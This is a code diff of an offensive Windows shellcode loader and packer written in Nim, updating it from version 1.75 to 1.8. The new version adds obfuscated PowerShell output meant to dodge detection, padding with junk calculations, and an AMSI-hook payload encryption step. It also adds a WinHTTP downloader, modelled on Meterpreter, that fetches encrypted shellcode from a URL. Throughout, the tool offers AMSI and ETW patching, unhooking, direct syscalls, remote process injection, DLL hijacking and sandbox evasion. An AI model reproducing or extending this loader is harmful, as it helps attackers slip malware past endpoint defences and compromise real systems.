@@ -28,6 +28,7 @@ import PELoad
 import CurrentProcInject
 import RemoteProcInject
 import DInvoke
+import Powershell
 
 
 from system import io
@@ -51,7 +52,7 @@ let banner = """
  / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
 /_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                        /____/                   /_____/      --> @ShitSecure
-                                                                 v1.75                                            
+                                                                 v1.8                                            
 
 """
 
@@ -60,10 +61,10 @@ echo banner
 #Handle arguments
 
 let helpmenu = """
-NimSyscall_Loader v 1.75
+NimSyscall_Loader v 1.8
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -90,6 +91,9 @@ Options:
   --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
+  --psout    Powershell Output format, reflectively loading the packed binary
+    --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation
+    --pslyrics    Add Lyrics as comments to avoid some more detections
 
 [Payload retrieval options]
 
@@ -198,6 +202,9 @@ var
     dllToClone: string = ""
     dllProxy: bool = false
     noNimMain: bool = false
+    psout: bool = false
+    uselyrics: bool = false
+    psobfs: bool = false
     cpl: bool = false
     replaceNimMain: bool = false
     big: bool
@@ -268,8 +275,9 @@ var
     metadata: bool = false
     antidebug: bool = false
     remoteMapSection: bool = false
+    remoteinject: bool = false
 
-let args = docopt(helpmenu, version = "NimSyscall_Loader 1.75")
+let args = docopt(helpmenu, version = "NimSyscall_Loader 1.8")
 
 if args["--file"]:
   let fname = args["--file"]
@@ -279,6 +287,16 @@ if args["--file"]:
 if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
+
+if args["--psout"]:
+    psout = true
+    reflective = true
+
+if args["--psobfs"]:
+    psobfs = true
+
+if args["--pslyrics"]:
+    uselyrics = true
 
 if args["--arguments"]:
   let argsForPE = args["--arguments"]
@@ -333,16 +351,19 @@ if args["--dllexportfunc"]:
 
 if args["--dllhijack"]:
   dllhijack = true
+  dll_out = true
 
 if args["--dllProxy"]:
   dllProxy = true
   dllhijack = true
+  dll_out = true
 
 if args["--noNimMain"]:
   noNimMain = true
 
 if args["--clone"]:
     dllclone = true
+    dll_out = true
     # NetClone will only work, when DllMain is exposed and leading to NimMain
     dllhijack = true
     let cloneDLL = args["--clone"]
@@ -350,6 +371,7 @@ if args["--clone"]:
 
 if args["--cpl"]:
   dllhijack = true
+  dll_out = true
   cpl = true
 
 
@@ -427,6 +449,7 @@ if args["--sleep-in-between"]:
     
 if args["--remoteinject"]:
   localinject = false
+  remoteinject = true
 
 if args["--blockDLLs"]:
     blockDLLs = true
@@ -582,6 +605,11 @@ if (hellsgate and jump):
 if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (peload and shellcode)):
     echo "Error: You can only use one of --csharp, --shellcode, --peload, or --peinject!"
     quit(1)
+
+if (dllclone and dllProxy):
+    echo "Error: You can only use one of --dllclone (Sideloading with Koppeling) or --dllProxy (Proxying through the legitimate DLL)!"
+    quit(1)
+
 if (peload or peinject):
     let stream = newFileStream(filename, mode = fmRead)
     defer: stream.close()
@@ -622,9 +650,9 @@ else:
         var newPath = packerPath & "/pwnPowershell/RunSpace.exe"
         blob = readFile(newPath)
 
-if (AMSICreateSectionHook):
-    echo "Not fully working yet, sorry!"
-    quit(0)
+#if (AMSICreateSectionHook):
+#    echo "Not fully working yet, sorry!"
+    #quit(0)
 
 #Read file and if PE convert to shellcode before
 if (peinject):
@@ -716,171 +744,221 @@ echo "Writing encrypted blob to disk: "
 var content: string = cast[string](enctext)
 writeFile(shellcodeFile[0], content)
 
+if(AMSICreateSectionHook):
+    echo "\r\n[*] Encrypting NtCreateSection-Hook Shellcode: \r\n"
+    var
+        data2: seq[byte] = toByteSeq(readFile("hook.bin"))
+
+        ectx2: ECB[aes256]
+    
+    # AES256 block size is 128 bits or 16 bytes, so we need to pad plaintext with
+    # 0 bytes. Not the best crypto, but to be honest - who tries to break AES256??
+    if ((len(data2) mod aes256.sizeBlock) != 0):
+        echo "[*] Payload length not a multiple of the BlockSize: ", aes256.sizeBlock
+        echo "[*] Length: " & $len(data2)
+        echo "[*] Padding payload..."
+        data2 = data2 & newSeq[byte](aes256.sizeBlock - (len(data2) mod aes256.sizeBlock))
+        echo "[*] New Length: " & $len(data2)
+        
+    var
+        plaintext2 = newSeq[byte](len(data2))
+        enctext2 = newSeq[byte](len(data2))
+
+    copyMem(addr plaintext2[0], addr data2[0], len(data2))
+    echo "[*] Plaintext length: " & $len(plaintext2)
+    echo "[*] Enctext length: " & $len(enctext2)
+
+    ectx2.init(key)
+    ectx2.encrypt(plaintext2, enctext2)
+    ectx2.clear()
+
+    echo "Writing encrypted Hook-blob to disk: "
+
+    var content2: string = cast[string](enctext2)
+    writeFile("enchook.blob", content2)
+
 proc getRandStub (): string =
+  var randName: string = rndStr(rand(10..25))
+  var randValues: string = rndStr(rand(50..500))
+  let randstub = fmt"""
+
+    var {randName}: string = obf("{randValues}")
+
+
+"""
+  return randstub
+
+proc getRandStubNoTab (): string =
   var randName: string = rndStr(rand(10..25))
   var randValues: string = rndStr(rand(50..500))
   let randstub = fmt"""
 
 var {randName}: string = obf("{randValues}")
 
+
 """
   return randstub
 
 let PatchargsFuncs = fmt"""
-var arguments: string = "{arguments}"
-when defined(args):
-    proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
-        var oldProtect: DWORD = 0
-        var lpAddress = targetAddr
-        var dwSize = cast[SIZE_T](len(data))
-        var status: NTSTATUS = 0x00000000
-        when defined(DInvoke):
-            var hProcess = MyGetCurrentProcess()
-        else:
-            var hProcess = GetCurrentProcess()
-        when defined(Syswhispers):
-            status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
-            when defined(verbose):
-                echo obf("NtProtectVirtualMemory: "),toHex(status)
-            if (status != 0):
+    var arguments: string = "{arguments}"
+    when defined(args):
+        proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
+            var oldProtect: DWORD = 0
+            var lpAddress = targetAddr
+            var dwSize = cast[SIZE_T](len(data))
+            var status: NTSTATUS = 0x00000000
+            when defined(DInvoke):
+                var hProcess = MyGetCurrentProcess()
+            else:
+                var hProcess = GetCurrentProcess()
+            when defined(Syswhispers):
+                status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
                 when defined(verbose):
-                    echo obf("[-] Failed to change memory protections.")
-                when defined(verbose):
-                    echo toHex(status)
-        else:
-            when defined(HellsGate):
-                if getSyscall(ntProtectTable):                
-                    syscall = ntProtectTable.wSysCall
+                    echo obf("NtProtectVirtualMemory: "),toHex(status)
+                if (status != 0):
+                    when defined(verbose):
+                        echo obf("[-] Failed to change memory protections.")
+                    when defined(verbose):
+                        echo toHex(status)
+            else:
+                when defined(HellsGate):
+                    if getSyscall(ntProtectTable):                
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
+                if (status != 0):
+                    when defined(verbose):
+                        echo obf("[-] Failed to change memory protections.")
+                        echo toHex(status)
+                
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
                 else:
                     when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-            status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
-            if (status != 0):
-                when defined(verbose):
-                    echo obf("[-] Failed to change memory protections.")
-                    echo toHex(status)
-            
-        when defined(Hellsgate):
-            if getSyscall(ntWriteTable):
-                syscall = ntWriteTable.wSysCall
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            var scLength: SIZE_T = SIZE_T(len(data))
+            var bytesWritten: SIZE_T
+                
+            when defined(Syswhispers):
+                status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
             else:
+                status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
                 when defined(verbose):
-                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
-        var scLength: SIZE_T = SIZE_T(len(data))
-        var bytesWritten: SIZE_T
-            
-        when defined(Syswhispers):
-            status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
-        else:
-            status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
-            when defined(verbose):
-                echo obf("NtWriteVirtualMemory: "),toHex(status)
-            if (status != 0):
-                when defined(verbose):
-                    echo obf("[-] Failed to write arguments.")
-                when defined(verbose):
-                    echo toHex(status)
-            else:
-                when defined(verbose):
-                    echo obf("[+] Arguments written successfully.")
-        when defined(Syswhispers):
-            status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
-        else:
-            when defined(HellsGate):
-                if getSyscall(ntProtectTable):                
-                    syscall = ntProtectTable.wSysCall
+                    echo obf("NtWriteVirtualMemory: "),toHex(status)
+                if (status != 0):
+                    when defined(verbose):
+                        echo obf("[-] Failed to write arguments.")
+                    when defined(verbose):
+                        echo toHex(status)
                 else:
                     when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
-            success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
-when defined(args):
-    proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
-        when defined x86:
-            var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
-        else:
-            var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
-        for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
-            shellcode.add t        
-        shellcode.add(byte(0xc3)) # ret
-        patchMemory(funcAddr, shellcode)
+                        echo obf("[+] Arguments written successfully.")
+            when defined(Syswhispers):
+                status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
+            else:
+                when defined(HellsGate):
+                    if getSyscall(ntProtectTable):                
+                        syscall = ntProtectTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
+    when defined(args):
+        proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
+            when defined x86:
+                var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
+            else:
+                var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
+            for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
+                shellcode.add t        
+            shellcode.add(byte(0xc3)) # ret
+            patchMemory(funcAddr, shellcode)
 """
 
 
-let RemoteProcImportStub = """
-import osproc
-"""
 
-let AssemblyImports = """
-import winim/clr
-from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
-"""
+
 
 let LoadAssemblyStub = fmt"""
 
-# Actually decrypt after doing everything else for better evasion.
-ptrEncText = cast[ptr byte](addr enctext[0])
-ptrDecText = cast[ptr byte](addr dectext[0])
-decryptlate()
 
-var assembly = load(dectext)
 
-from os import paramCount,paramStr
+    # Actually decrypt after doing everything else for better evasion.
+    ptrEncText = cast[ptr byte](addr enctext[0])
+    ptrDecText = cast[ptr byte](addr dectext[0])
+    decryptlate()
+    discard calcHard()
+    var assembly = load(dectext)
+    discard calcHard()
 
-when defined(lib_only):
-    # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
-    # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
-    AttachConsole(-1)
-
-when defined(Fluctuate):
-    g_fluctuationData.shellcodeAddr = dectext[0].addr
-    g_fluctuationData.shellcodeSize = SIZE_T(dectext.len)
-    # Will change the hardcoded key later on
-    when defined(amd64):
-        g_fluctuationData.encodeKey = 0x1337DE4D
-    when defined(i386):
-        g_fluctuationData.encodeKey = 0x1337
-    g_fluctuationData.currentlyEncrypted = false
-    g_fluctuationData.protect = PAGE_READWRITE
-    g_fluctuate = FluctuateToRW
-    if (hookSleep()):
-        when defined(verbose):
-            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
-    else:
-        when defined(verbose):
-            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
-
-var cmd: seq[string]
-var i = 1
-when defined(args):
-    cmd.add({arguments.split(" ")})
-while i <= paramCount():
     when defined(lib_only):
-        if (i != 1):
-            # first parameter is rundll32.exe,Funcname (skip that)
+        # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
+        # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
+        AttachConsole(-1)
+
+    when defined(Fluctuate):
+        g_fluctuationData.shellcodeAddr = dectext[0].addr
+        g_fluctuationData.shellcodeSize = SIZE_T(dectext.len)
+        # Will change the hardcoded key later on
+        when defined(amd64):
+            g_fluctuationData.encodeKey = 0x1337DE4D
+        when defined(i386):
+            g_fluctuationData.encodeKey = 0x1337
+        g_fluctuationData.currentlyEncrypted = false
+        g_fluctuationData.protect = PAGE_READWRITE
+        g_fluctuate = FluctuateToRW
+        if (hookSleep()):
+            when defined(verbose):
+                echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
+        else:
+            when defined(verbose):
+                echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")
+
+    var cmd: seq[string]
+    var i = 1
+    discard calcHard()
+    when defined(args):
+        cmd.add({arguments.split(" ")})
+    while i <= paramCount():
+        discard calcHard()
+        when defined(lib_only):
+            if (i != 1):
+                # first parameter is rundll32.exe,Funcname (skip that)
+                cmd.add(paramStr(i))
+        else:
             cmd.add(paramStr(i))
-    else:
-        cmd.add(paramStr(i))
-    inc(i)
+        inc(i)
 """
 
 let LoadAssemblyStubArgs = """
-var arr = toCLRVariant(cmd, VT_BSTR)
-assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
+    var arr = toCLRVariant(cmd, VT_BSTR)
+    discard calcHard()
+    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
+    discard calcHard()
+
+when not defined(proxy):
+    discard main(nil)
+
+when defined(defaultMain):
+    discard main(nil)
 """
 
 let LoadAssemblyStubNoArgs = """
-var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
-assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
+    discard calcHard()
+    var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
+    discard calcHard()
+    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
+
+when not defined(proxy):
+    discard main(nil)
+
+when defined(defaultMain):
+    discard main(nil)
 """
 
-let WinLeanGetCurrentProcStub = """
-from winlean import getCurrentProcess
-
-"""
-
-let Winimleanstub = """
-import winim/lean
-"""
 
 let SleepStubSecond * = fmt"""
 when defined(verbose):
@@ -900,43 +978,183 @@ when isMainModule:
 """
 
 let ShellcoderemoteinjectStub_customprocseccond * = fmt"""
-var remoteprocesses: seq[string] = {remoteprocesses}
+    var remoteprocesses: seq[string] = {remoteprocesses}
 """
 
 let ShellcodeFromFileStub * = fmt"""
 
-var fileHandle: File
-var encString: string
-for f in {shellcodeFile}:
-    try:
-        fileHandle = open(f, fmRead)
-        encString = fileHandle.readAll()
-        break
-    except:
-        when defined(verbose):
-            echo obf("[-] Failed to open file: ") & f
+    var fileHandle: File
+    var encString: string
+    for f in {shellcodeFile}:
+        try:
+            fileHandle = open(f, fmRead)
+            encString = fileHandle.readAll()
+            break
+        except:
+            when defined(verbose):
+                echo obf("[-] Failed to open file: ") & f
 
 """
 
 let ShellcodeFromURLStub * = fmt"""
 
-import std/net
-import std/httpclient
-when defined(ssl):
-    var client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
-else:
-    var client = newHttpClient()
-var encString = client.getContent("{shellcodeURL}")
+    #[
+        References:
+            - https://github.com/rapid7/metasploit-payloads/blob/9ebb095a0acf95c4e55e62d44a57f7da740f1b16/c/meterpreter/source/metsrv/server_transport_winhttp.c
+            - https://github.com/rapid7/metasploit-payloads/blob/9ebb095a0acf95c4e55e62d44a57f7da740f1b16/c/meterpreter/source/metsrv/server_transport_wininet.c
+            - https://gist.github.com/henkman/2e7a4dcf4822bc0029d7d2af731da5c5
+    ]#
+
+
+    proc httpRequestException(msg: string) =
+        raise newException(ValueError, "Error when performing HTTP request: " & $msg)
+
+    proc safeStringSlice(n: LPCWSTR, l: DWORD): LPCWSTR =
+        var
+            nim_string = $n
+            nim_int = l-1
+
+        return nim_string[0..nim_int]
+
+    proc httpGetRequest(url: string): string =
+        var
+            bits: URL_COMPONENTS
+            flags: DWORD
+            hSession, hConnect, hReq: HINTERNET
+            ieConfig: WINHTTP_CURRENT_USER_IE_PROXY_CONFIG
+            proxyInfo: WINHTTP_PROXY_INFO
+            dwSize, dwDownloaded: DWORD = 0
+            pszOutBuffer: LPSTR
+            bResults: bool
+            totalDownloaded: int
+            dataBuffer: StringStream = newStringStream("")
+
+        when defined(ssl):
+            flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE or WINHTTP_FLAG_SECURE
+        else:
+            flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE
+
+        when defined(verbose):
+            echo obf("+ Attempting HTTP GET request to: ") & url
+
+        hSession = WinHttpOpen(obf("PackRequest"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)
+        if hSession.isNil:
+            when defined(verbose):
+                httpRequestException(obf("Creating hSession returned an error: ") & $GetLastError())
+
+        zeroMem(addr bits, sizeof(bits))
+        bits.dwStructSize = cast[DWORD](sizeof(bits))
+
+        bits.dwSchemeLength    = -1
+        bits.dwHostNameLength  = -1
+        bits.dwUrlPathLength   = -1
+        bits.dwExtraInfoLength = -1
+
+        WinHttpCrackUrl(url, 0, 0, addr bits)
+        var actual_hostname = safeStringSlice(bits.lpszHostName, bits.dwHostNameLength)
+        var actual_scheme = safeStringSlice(bits.lpszScheme, bits.dwSchemeLength)
+        when defined(verbose):
+            echo obf("* [HTTP] Scheme: "), actual_scheme
+            echo obf("* [HTTP] Hostname: "), actual_hostname
+            echo obf("* [HTTP] URL Path: "), bits.lpszUrlPath
+
+        if not hSession.isNil:
+            hConnect = WinHttpConnect(hSession, actual_hostname, bits.nPort, 0)
+
+        if not hConnect.isNil:
+            hReq = WinHttpOpenRequest(hConnect, "GET", bits.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)
+
+        if WinHttpGetIEProxyConfigForCurrentUser(addr ieConfig):
+            when defined(verbose):
+                echo obf("* [PROXY] Got IE Configuration")
+                echo obf("* [PROXY] Autodetect: "), ieConfig.fAutoDetect
+                echo obf("* [PROXY] Auto URL: "), $ieConfig.lpszAutoConfigUrl
+                echo obf("* [PROXY] Proxy: "), $ieConfig.lpszProxy
+                echo obf("* [PROXY] Proxy Bypass: "), $ieConfig.lpszProxyBypass
+
+            if (not ieConfig.lpszAutoConfigUrl.isNil or ieConfig.fAutoDetect.bool):
+                var autoProxyOpts: WINHTTP_AUTOPROXY_OPTIONS
+
+                if ieConfig.fAutoDetect:
+                    when defined(verbose):
+                        echo obf("* [PROXY] IE config set to autodetect with DNS or DHCP")
+                    autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT
+                    autoProxyOpts.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP or WINHTTP_AUTO_DETECT_TYPE_DNS_A
+                    autoProxyOpts.lpszAutoConfigUrl = NULL
+
+                elif not ieConfig.lpszAutoConfigUrl.isNil:
+                    when defined(verbose):
+                        echo obf("* [PROXY] IE config set to autodetect with URL "), ieConfig.lpszAutoConfigUrl
+
+                    autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL
+                    autoProxyOpts.dwAutoDetectFlags = 0
+                    autoProxyOpts.lpszAutoConfigUrl = ieConfig.lpszAutoConfigUrl
+
+                autoProxyOpts.fAutoLogonIfChallenged = TRUE;
+
+                WinHttpGetProxyForUrl(hSession, bits.lpszUrlPath, addr autoProxyOpts, addr proxyInfo)
+
+            elif not ieConfig.lpszProxy.isNil:
+                when defined(verbose):
+                    echo obf("* [PROXY] IE config set to proxy "), ieConfig.lpszProxy, obf(" with bypass "), ieConfig.lpszProxyBypass 
+
+                proxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY
+                proxyInfo.lpszProxy = ieConfig.lpszProxy
+                proxyInfo.lpszProxyBypass = ieConfig.lpszProxyBypass
+
+                ieConfig.lpszProxy = NULL
+                ieConfig.lpszProxyBypass = NULL
+
+        WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY, addr proxyInfo, cast[DWORD](sizeof(WINHTTP_PROXY_INFO)))
+
+        if not hReq.isNil:
+            bResults = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
+
+        if bResults:
+            bResults = WinHttpReceiveResponse(hReq, NULL)
+
+        if bResults:
+            while true:
+                if not WinHttpQueryDataAvailable(hReq, addr dwSize).bool:
+                    httpRequestException("Error in WinHttpQueryDataAvalable: " & $GetLastError())
+
+                if dwSize == 0:
+                    break
+
+                pszOutBuffer = newString(dwSize+1)
+                zeroMem(pszOutBuffer, dwSize+1)
+
+                if not WinHttpReadData(hReq, addr pszOutBuffer[0], dwSize, addr dwDownloaded).bool:
+                    httpRequestException("Error receiving data: " & $GetLastError())
+
+                dataBuffer.writeData(addr pszOutBuffer[0], dwDownloaded)
+                totalDownloaded += dwDownloaded
+
+            when defined(verbose):
+                echo obf("+ Total data received: "), totalDownloaded
+
+            WinHttpCloseHandle(hReq)
+            WinHttpCloseHandle(hConnect)
+            WinHttpCloseHandle(hSession)
+
+            dataBuffer.setPosition(0)
+            return dataBuffer.readAll()
+
+    var encString = httpGetRequest(obf("{shellcodeURL}"))
 
 """
 
 let ShellcodeDefaultStub * = fmt"""
-const encstring = slurp"enc.blob"
+    const encstring = slurp"enc.blob"
 
 """
 
 let Cryptstub1 = """
 import winim/lean
+import strformat
+from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
+import strutils
+import ptr_math
 #from dynlib import LibHandle, loadLib
 # something seams to be still missing here
 #from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
@@ -944,19 +1162,53 @@ import winim/lean
 #import winim/winstr
 #import winim/utils
 #from winim import winstr,winimbase,windef
-import strformat
-from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
-import strutils
-import ptr_math
-import strenc
+
+when defined(csharp):
+    import winim/clr
+    from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
+    from os import paramCount,paramStr
+
+when defined(sleep):
+    import random
+    import times
+
+when defined http:
+    import winim/inc/winhttp
+    import streams
+when defined ssl:
+    import winim/inc/winhttp
+    import streams
+
+when defined(Hellsgate):
+    from os import paramStr
+    {.passC:"-masm=intel".}
+    from winlean import getCurrentProcess
+
+when defined(remoteinject):
+    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
+    import osproc,os
+
+when defined(COMVARETW):
+    import osproc,os
+    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
+    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+
+when not defined(proxy):
+    import strenc
 when defined(Fluctuate):
     import Fluctuation
 
-var success: BOOL
+# We use a custom memCopy/copyMem function here, which takes two pointers and a size as input and copies the seccond pointer content into the first
+proc moveMemory(dest: pointer, src: pointer, size: int) =
+    var csrc: ptr char = cast[ptr char](src)
+    var cdest: ptr char = cast[ptr char](dest)
+    for i in 0 ..< size:
+        cdest[i] = csrc[i]
 
 proc toString(bytes: openarray[byte]): string =
   result = newString(bytes.len)
-  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)
+  moveMemory(result[0].addr, bytes[0].unsafeAddr, bytes.len)
 
 ### Modified code from Nim-Strenc to avoid XORing of long strings -> Modified by @chvancooten, credit to him
 ### Original source: https://github.com/Yardanico/nim-strenc
@@ -989,162 +1241,199 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
-var dctx: ECB[aes256]
+proc calcHard *(): int =
+    var rand: int = 0
+    for i in 0 .. 10:
+        rand += 15
+        if ((rand mod 9) != 0):
+            rand += 15
+    return rand
 
 """
 
 let Cryptstub2 = fmt"""
+    var dctx: ECB[aes256]
+    var success: BOOL
+    when defined(sleepinbetween):
+        var sleepbetweentime: int = {sleepinbetween}
 
-when defined(sleepinbetween):
-    var sleepbetweentime: int = {sleepinbetween}
-
-var enctext: seq[byte] = toByteSeq(encstring)
-var key: array[aes256.sizeKey, byte]
-var envkey: string = obf("{envkey}")
+    var enctext: seq[byte] = toByteSeq(encstring)
+    discard calcHard()
+    var key: array[aes256.sizeKey, byte]
+    discard calcHard()
+    var envkey: string = obf("{envkey}")
 """
 
 let Cryptstub3 = fmt"""
     
-var expandedkey = toByteSeq(envkey)
-if ((len(expandedkey) mod aes256.sizeBlock) != 0):
+    var expandedkey = toByteSeq(envkey)
+    discard calcHard()
+    if ((len(expandedkey) mod aes256.sizeBlock) != 0):
+        when defined(verbose):
+            echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
+            echo "[*] Length: " & $len(expandedkey)
+            echo "[*] Padding Key with null bytes"
